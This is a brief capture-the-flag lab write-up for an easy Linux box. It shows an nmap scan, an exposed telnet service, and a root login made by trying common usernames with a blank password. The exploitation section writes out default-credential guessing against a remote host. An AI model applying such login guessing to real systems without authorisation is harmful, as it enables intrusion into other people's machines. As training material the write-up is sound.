# Box: Meow
Difficulty: Easy
OS: Linux

## 🧠 Recon
**Nmap Scan:**
```bash
sudo nmap -sV 10.10.14.12

## 🔍 Enumeration
Found an open port 23/tcp, running the telnet service

## 💥 Exploitation
Tried logging in with common usernames and no password:
admin — ❌
administrator — ❌
root — ✅ Success

Commands executed:
telnet 10.10.14.12
login: root
Password: [blank]
Gained shell access as root.

## 🔐 Privilege Escalation
Not required - root access via telnet

## 🧼 Cleanup & Lessons
N/A

